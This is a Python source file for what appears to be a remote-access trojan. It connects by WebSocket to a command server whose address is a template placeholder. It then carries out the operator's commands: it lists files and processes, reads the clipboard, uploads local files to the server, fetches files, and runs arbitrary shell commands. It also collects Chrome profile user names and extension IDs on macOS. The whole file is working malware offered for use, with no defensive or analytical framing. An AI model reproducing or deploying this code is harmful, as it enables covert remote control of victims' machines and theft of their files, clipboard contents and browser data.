import websocket
import json
import os
import subprocess
import pyperclip
import threading
import psutil


file_write_handle = None
download_in_progress = False
current_filename = None

def send_result(ws, result):
    response = {
        "action": "send_result",
        "status": "success",
        "result": result
    }
    ws.send(json.dumps(response))

def on_message(ws, message):
    global file_downloads

    try:
        if isinstance(message, bytes):
            if file_write_handle:
                file_write_handle.write(message)
                print(f"Received file chunk: {len(message)} bytes.")
            else:
                print("Error: Received file data without an active download.")
        else:
            if not message.strip():
                print("Received an empty message, ignoring.")
                return
            response = json.loads(message)
            if response.get("status") == "completed":
                print(f"Download completed for {current_filename}.")
                cleanup_download()
            elif response.get("status") == "error":
                print(f"Error during download: {response.get('message')}")
                cleanup_download()
            else:
                print(f"Received message: {message}")
                command = response.get("command")
                if command:
                    handle_command(ws, command)
    except json.JSONDecodeError as e:
        print(message)
        print(f"Error decoding message as JSON: {e}. Raw message: {message}")
    except Exception as e:
        print(f"Error processing message: {e}")
        cleanup_download()


def on_error(ws, error):
    print(f"Error: {error}")

def on_close(ws):
    print("Connection closed")
    cleanup_download()

def on_open(ws):
    print("Connected to WebSocket server")

def list_files(ws):
    try:
        files = os.listdir('.')
        result = "\n".join(files)
        send_result(ws, result)
    except Exception as e:
        send_result(ws, f"Error listing files: {str(e)}")

def get_clipboard(ws):
    try:
        clipboard_content = pyperclip.paste()
        send_result(ws, clipboard_content)
    except Exception as e:
        send_result(ws, f"Error getting clipboard content: {str(e)}")

def download_file(ws, filename):
    global file_write_handle, download_in_progress, current_filename

    if download_in_progress:
        print(f"Another download is already in progress for {current_filename}.")
        return

    try:
        save_path = filename
        file_write_handle = open(save_path, "wb")
        current_filename = filename
        download_in_progress = True

        request = {"action": "download_file", "filename": filename}
        ws.send(json.dumps(request))
        print(f"Download request sent for {filename}. Saving to {save_path}.")
    except Exception as e:
        print(f"Error initiating download: {e}")
        cleanup_download()

def cleanup_download():

    global file_write_handle, download_in_progress, current_filename

    if file_write_handle:
        file_write_handle.close()
        file_write_handle = None
    download_in_progress = False
    current_filename = None

def upload_file(ws, file_path):
    filename = os.path.basename(file_path)
    filesize = os.path.getsize(file_path)

    request = {
        "action": "upload_file",
        "filename": filename,
        "filesize": filesize,
    }
    ws.send(json.dumps(request))

    with open(file_path, "rb") as f:
        while chunk := f.read(1024 * 4):  
            ws.send(chunk, opcode=websocket.ABNF.OPCODE_BINARY)
    ws.send(json.dumps({"action": "upload_completed"}))
    print(f"Upload completed for file: {filename}")

def execute_command(ws, command):
    try:
        output = subprocess.check_output(command, shell=True, text=True)
        send_result(ws, output)
    except subprocess.CalledProcessError as e:
        send_result(ws, f"Error executing command: {str(e)}")

def list_processes(ws):
    try:
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'username']):
            processes.append(proc.info)
        send_result(ws, str(processes))
    except Exception as e:
        send_result(ws, f"Error listing processes: {str(e)}")
        
def get_chrome_profiles_and_extensions(ws):
    try:
        local_state_path = f'/Users/{os.getlogin()}/Library/Application Support/Google/Chrome/Local State'
        output = []
    
        with open(local_state_path, 'r', encoding='utf-8') as file:
            local_state = json.load(file)
    
        if 'profile' in local_state and 'last_active_profiles' in local_state['profile']:
            output.append("\nLast active profiles:")
            output.append(str(local_state['profile']['last_active_profiles']))
        else:
            output.append("\nCannot find last_active_profiles.")
    
        if 'profile' in local_state and 'last_used' in local_state['profile']:
            output.append("\nLast used profile:")
            output.append(str(local_state['profile']['last_used']))
        else:
            output.append("\nCannot find last_used.")
    
        if 'profile' in local_state and 'info_cache' in local_state['profile']:
            output.append("\nUser names in profile.info_cache:")
            for profile_name, profile_info in local_state['profile']['info_cache'].items():
                if 'user_name' in profile_info:
                    user_name = profile_info['user_name']
                    output.append(f" - Profile: {profile_name}, User Name: {user_name}")
                    
                    extension_dir = f'Library/Application Support/Google/Chrome/{profile_name}/Local Extension Settings'
                    
                    if os.path.exists(extension_dir):
                        extensions = os.listdir(extension_dir)
                        output.append(f"   Extensions for {profile_name}:")
                        for ext in extensions:
                            output.append(f"     - {ext}")
                    else:
                        output.append(f"   Directory does not exist: {extension_dir}")
                else:
                    output.append(f" - Profile: {profile_name}, cannot find user_name.")
            output.append("Search extension by https://chrome.google.com/webstore/detail/TEXT/{id}")
        else:
            output.append("\nCannot find profile.info_cache.")
        send_result(ws, str(output))
    except Exception as e:
        send_result(ws, f"Error get_chrome_profiles_and_extensions: {str(e)}")
        
def handle_command(ws, command):
    if command == "list_files":
        list_files(ws)
    elif command == "get_clipboard":
        get_clipboard(ws)
    elif command.startswith("download_file "):
        download_file(ws, command.split(" ", 1)[1])
    elif command.startswith("upload_file "):
        upload_file(ws, command.split(" ", 1)[1])
    elif command.startswith("execute_command "):
        execute_command(ws, command.split(" ", 1)[1])
    elif command == "list_processes":
        list_processes(ws)
    elif command == "get_chrome_info":
        get_chrome_profiles_and_extensions(ws)
    else:
        send_result(ws, "Unknown command")

if __name__ == "__main__":
    ip = "{ip}"
    port = "{port}"
    # ip = "127.0.0.1"
    # port = "8081"
    websocket_url = "ws://"+ip+":"+port+"/ws"
    ws = websocket.WebSocketApp(websocket_url,
                                on_message=on_message,
                                on_error=on_error,
                                on_close=on_close)
    
    ws.on_open = on_open
    ws_thread = threading.Thread(target=ws.run_forever)
    ws_thread.start()

    try:
        while True:
            pass
    except KeyboardInterrupt:
        ws.close()
        print("WebSocket client closed")

